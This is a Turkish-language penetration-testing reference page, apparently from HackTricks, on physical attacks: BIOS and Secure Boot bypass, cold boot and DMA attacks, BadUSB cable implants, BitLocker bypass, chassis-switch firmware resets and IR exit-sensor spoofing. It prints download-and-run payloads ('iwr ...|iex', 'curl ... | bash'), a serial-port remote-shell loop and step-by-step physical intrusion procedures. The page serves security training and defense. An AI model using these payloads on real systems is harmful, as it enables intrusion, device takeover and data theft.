# Fiziksel Saldırılar

{{#include ../banners/hacktricks-training.md}}

## BIOS Parola Kurtarma ve Sistem Güvenliği

**BIOS'i sıfırlama** birkaç yolla gerçekleştirilebilir. Çoğu anakart, çıkarıldığında yaklaşık **30 dakika** boyunca BIOS ayarlarını, parola dahil, sıfırlayan bir **pil** içerir. Alternatif olarak, belirli pinleri bağlayarak bu ayarları sıfırlamak için **anakarttaki bir jumper** ayarlanabilir.

Donanım ayarlamalarının mümkün veya pratik olmadığı durumlarda, **yazılım araçları** bir çözüm sunar. **Kali Linux** gibi dağıtımlarla bir sistemi **Live CD/USB**'den çalıştırmak, BIOS parola kurtarmaya yardımcı olabilecek **_killCmos_** ve **_CmosPWD_** gibi araçlara erişim sağlar.

BIOS parolası bilinmiyorsa, yanlış girildiğinde genellikle **üç kez** bir hata kodu oluşur. Bu kod [https://bios-pw.org](https://bios-pw.org) gibi web sitelerinde kullanılabilir ve muhtemelen kullanılabilir bir parola elde etmek için yararlı olabilir.

### UEFI Güvenliği

Geleneksel BIOS yerine **UEFI** kullanan modern sistemlerde, **chipsec** aracı UEFI ayarlarını analiz etmek ve değiştirmek (ör. **Secure Boot**'u devre dışı bırakmak) için kullanılabilir. Bu, aşağıdaki komutla gerçekleştirilebilir:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analizi ve Cold Boot Attacks

RAM, güç kesildikten sonra kısa süre veri tutar, genellikle **1 ila 2 dakika**. Bu kalıcılık sıvı azot gibi soğuk maddeler uygulanarak **10 dakikaya** kadar uzatılabilir. Bu genişletilmiş süre boyunca, analiz için **memory dump** oluşturmak amacıyla **dd.exe** ve **volatility** gibi araçlar kullanılabilir.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION**, **FireWire** ve **Thunderbolt** gibi arayüzlerle uyumlu DMA üzerinden **physical memory manipulation** amaçlı tasarlanmış bir araçtır. Belleği herhangi bir parolayı kabul edecek şekilde yama uygulayarak giriş prosedürlerini atlamaya izin verir. Ancak **Windows 10** sistemlere karşı etkisizdir.

---

## Live CD/USB ile Sistem Erişimi

Sistem ikili dosyalarını, ör. **_sethc.exe_** veya **_Utilman.exe_**, **_cmd.exe_** kopyası ile değiştirmek sistem ayrıcalıklarına sahip bir komut istemi sağlayabilir. **chntpw** gibi araçlar Windows kurulumunun **SAM** dosyasını düzenlemek ve parola değiştirmek için kullanılabilir.

**Kon-Boot** Windows çekirdeğini veya UEFI'yi geçici olarak değiştirerek parola bilmeden Windows sistemlerine giriş yapılmasını sağlayan bir araçtır. Daha fazla bilgi için: [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Windows Güvenlik Özellikleriyle Başetme

### Boot ve Recovery Kısayolları

- **Supr**: BIOS ayarlarına erişim.
- **F8**: Recovery moduna giriş.
- Windows açılış logosundan sonra **Shift** tuşuna basmak autologon'u atlatabilir.

### BAD USB Devices

Rubber Ducky ve Teensyduino gibi cihazlar, hedef bilgisayara takıldığında önceden tanımlı payload'ları çalıştırabilen **bad USB** cihazları oluşturmak için platform görevi görür.

### Volume Shadow Copy

Administrator ayrıcalıkları PowerShell aracılığıyla hassas dosyaların, ör. **SAM** dosyasının, kopyalarını oluşturmaya izin verir.

## BadUSB / HID Implant Techniques

### Wi‑Fi managed cable implants

- ESP32-S3 tabanlı implantlar, ör. **Evil Crow Cable Wind**, USB-A→USB-C veya USB-C↔USB-C kablolarının içine gizlenir, yalnızca bir USB klavye olarak enumerate edilir ve C2 yığınına Wi‑Fi üzerinden erişim sağlar. Operatörün kabloyu kurban host'tan güçlendirmesi, `Evil Crow Cable Wind` adlı ve parola olarak `123456789` kullanılan bir hotspot oluşturması ve gömülü HTTP arayüzüne erişmek için [http://cable-wind.local/](http://cable-wind.local/) (veya DHCP adresi) adresine gitmesi yeterlidir.
- Tarayıcı UI'si *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* ve *Config* sekmelerini sağlar. Saklanan payload'lar OS'e göre etiketlenir, klavye düzenleri anında değiştirilir ve VID/PID dizeleri bilinen çevre birimlerini taklit edecek şekilde değiştirilebilir.
- C2 kablonun içinde yaşadığı için bir telefon payload'ları hazırlayabilir, yürütmeyi tetikleyebilir ve Wi‑Fi kimlik bilgilerini host OS'e dokunmadan yönetebilir — kısa süreli fiziksel sızmalar için ideal.

### OS-aware AutoExec payloads

- AutoExec kuralları bir veya daha fazla payload'ı USB enumerate edildikten hemen sonra çalışacak şekilde bağlar. Implant hafif bir OS fingerprinting yapar ve eşleşen script'i seçer.
- Örnek iş akışı:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Yürütme gözetimsiz olduğu için, sadece bir şarj kablosunu değiştirmek oturum açmış kullanıcı bağlamında “plug-and-pwn” ilk erişimini sağlayabilir.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Saklanan bir payload bir konsol açar ve yeni USB seri cihazına gelenleri çalıştıran bir döngüyü yapıştırır. Minimal bir Windows varyantı şudur:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant, USB CDC kanalını açık tutarken ESP32-S3 operatöre geri bir TCP client (Python script, Android APK, veya desktop executable) başlatır. TCP oturumuna yazılan her byte yukarıdaki seri döngüsüne iletilir; bu, air-gapped host'larda bile remote command execution sağlar. Output sınırlıdır, bu yüzden operators genellikle blind commands (hesap oluşturma, ek tooling hazırlama vb.) çalıştırır.

### HTTP OTA update surface

- Aynı web stack genellikle unauthenticated firmware updates sunar. Evil Crow Cable Wind `/update` üzerinde dinler ve yüklenen herhangi bir binary'i flash'lar:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Saha operatörleri, kabloyu açmadan (ör. flash USB Army Knife firmware) bir operasyon sırasında özellikleri hot-swap yapabilir; böylece implant hedef host'a takılıyken yeni yeteneklere geçebilir.

## BitLocker Şifrelemesini Atlatma

BitLocker şifrelemesi, bir bellek dökümü dosyasında (**MEMORY.DMP**) **kurtarma parolası** bulunması durumunda potansiyel olarak atlatılabilir. Bu amaçla **Elcomsoft Forensic Disk Decryptor** veya **Passware Kit Forensic** gibi araçlar kullanılabilir.

---

## Kurtarma Anahtarı Ekleme için Sosyal Mühendislik

Sosyal mühendislik taktikleriyle, kullanıcıyı tüm sıfırlardan oluşan yeni bir kurtarma anahtarı ekleyen bir komutu çalıştırmaya ikna ederek yeni bir BitLocker kurtarma anahtarı eklenebilir; bu da şifre çözme sürecini basitleştirir.

---

## Şasi Açılma / Bakım Anahtarlarını Kullanarak BIOS'u Fabrika Ayarlarına Sıfırlama

Birçok modern dizüstü ve küçük form faktörlü masaüstünde, Embedded Controller (EC) ve BIOS/UEFI firmware'i tarafından izlenen bir **chassis-intrusion switch** bulunur. Ana amacı cihaz açıldığında bir uyarı vermek olsa da, üreticiler bazen anahtar belirli bir desenle değiştirilince tetiklenen belgelenmemiş bir **kurtarma kısayolu** uygularlar.

### Saldırı Nasıl Çalışır

1. Anahtar, EC üzerindeki bir **GPIO interrupt**'ına bağlanmıştır.
2. EC üzerinde çalışan firmware **basışların zamanlamasını ve sayısını** takip eder.
3. Sabit kodlu bir desen tanındığında, EC *mainboard-reset* rutinini çağırır ve bu rutin **sistem NVRAM/CMOS içeriğini siler**.
4. Bir sonraki önyüklemede BIOS varsayılan değerleri yükler — **yönetici parolası, Secure Boot anahtarları ve tüm özel yapılandırmalar silinir**.

> Secure Boot devre dışı bırakıldığında ve firmware parolası kaldırıldığında, saldırgan herhangi bir harici OS imajını önyükleyip dahili sürücülere sınırsız erişim elde edebilir.

### Gerçek Dünya Örneği – Framework 13 Dizüstü

Framework 13 (11th/12th/13th-gen) için kurtarma kısayolu şudur:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Onuncu döngüden sonra EC, BIOS'a bir sonraki yeniden başlatmada NVRAM'i silmesini söyleyen bir bayrak ayarlar. Tüm prosedür ~40 s sürer ve **yalnızca bir tornavida** gerektirir.

### Generic Exploitation Procedure

1. Hedefi açın veya suspend-resume yapın, böylece EC çalışıyor olur.
2. Alt kapağı çıkarın ve intrusion/maintenance switch'i açığa çıkarın.
3. Satıcıya özgü toggle desenini yeniden oluşturun (dokümantasyon, forumlar veya EC firmware'ini tersine mühendislikle inceleyin).
4. Yeniden monte edin ve yeniden başlatın – firmware korumaları devre dışı olmalıdır.
5. Bir live USB ile boot edin (ör. Kali Linux) ve olağan post-exploitation işlemlerini gerçekleştirin (credential dumping, data exfiltration, malicious EFI binaries implant etme, vb.).

### Detection & Mitigation

* Chassis-intrusion olaylarını OS yönetim konsolunda kaydedin ve beklenmeyen BIOS sıfırlamalarıyla ilişkilendirin.
* Vidalar/kapatma kapakları üzerinde açılmayı tespit etmek için **müdahale kanıtı sağlayan mühürler** kullanın.
* Cihazları **fiziksel olarak kontrollü alanlarda** tutun; fiziksel erişimin tam ele geçirmeye eşit olduğunu varsayın.
* Mümkünse satıcının “maintenance switch reset” özelliğini devre dışı bırakın veya NVRAM sıfırlamaları için ek bir kriptografik yetkilendirme gerektirin.

---

## Temassız Çıkış Sensörlerine Karşı Gizli IR Enjeksiyonu

### Sensör Özellikleri
- Pazar tipi “wave-to-exit” sensörler, near-IR LED emitörü ile TV-remote tarzı bir alıcı modülünü eşleştirir; bu modül doğru carrier'ın yaklaşık ~4–10 darbesini (≈30 kHz) gördükten sonra ancak logic high bildirir.
- Bir plastik koruyucu, emitter ile alıcıyı birbirlerine doğrudan bakmaktan engeller; bu yüzden controller, doğrulanmış carrier'ın yakın bir yansımadan geldiğini varsayar ve kapı strike'ını açan bir relay sürer.
- Controller hedefin var olduğuna kanaat getirince genellikle outbound modulation envelope'i değiştirir, ancak alıcı filtrelenmiş carrier ile eşleşen herhangi bir burst'u kabul etmeye devam eder.

### Saldırı İş Akışı
1. **Emisyon profilini yakalayın** – controller pinleri üzerine bir logic analyser kıskaçlayın ve internal IR LED'i süren hem pre-detection hem de post-detection dalga formlarını kaydedin.
2. **Sadece “post-detection” dalga formunu replay edin** – stok emitter'i çıkarın/ihmal edin ve dış bir IR LED'i baştan itibaren zaten tetiklenmiş desenle sürün. Alıcı yalnızca pulse count/frequency ile ilgilendiği için sahte carrier'ı gerçek bir yansıma olarak değerlendirir ve röle hattını aktif eder.
3. **İletimi kontrol altına alın** – carrier'ı ayarlı burst'lar halinde gönderin (ör. onlarca milisaniye açık, benzer kapalı) minimum pulse sayısını sağlamak için receiver’ın AGC'sini veya parazit işleme mantığını doyurmadan. Sürekli emisyon sensörü hızla duyarsızlaştırır ve rölenin tetiklenmesini durdurur.

### Uzun Menzilli Yansıtmalı Enjeksiyon
- Tezgah LED'ini yüksek güçlü bir IR diyot, MOSFET sürücüsü ve fokus optikler ile değiştirerek ~6 m'den güvenilir tetikleme sağlanabilir.
- Saldırganın alıcı açıklığına direkt görüş hattına ihtiyacı yoktur; ışını camdan görülebilen iç duvarlara, raflara veya kapı çerçevelerine nişanlamak yansıtılan enerjinin ~30° görüş alanına girmesini sağlar ve yakından el sallamayı taklit eder.
- Alıcılar yalnızca zayıf yansımalar beklediğinden, çok daha güçlü bir dış ışın birden çok yüzeyden sekip yine de tespit eşiğinin üzerinde kalabilir.

### Silahlandırılmış Saldırı Feneri
- Sürücüyü ticari bir el fenerinin içine gömmek aracı göz önünde gizler. Görünür LED'i alıcının bandına uygun yüksek güçlü bir IR LED ile değiştirin, ≈30 kHz burst'ları üretmek için bir ATtiny412 (veya benzeri) ekleyin ve LED akımını çekmek için bir MOSFET kullanın.
- Teleskopik zoom lens menzil/duyarlılık için ışını sıkılaştırır; MCU kontrolündeki bir titreşim motoru ise görünür ışık yaymadan modülasyonun aktif olduğuna dair haptik onay verir.
- Birkaç depolanmış modülasyon desenini (hafifçe farklı carrier frekansları ve envelope'lar) döngülemek, yeniden markalanmış sensör aileleri arasında uyumluluğu artırır; operatör yansıtıcı yüzeyleri tarayıncaya, röle sesli bir tıkırtı yapıp kapı serbest kalana kadar bunu sürdürebilir.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
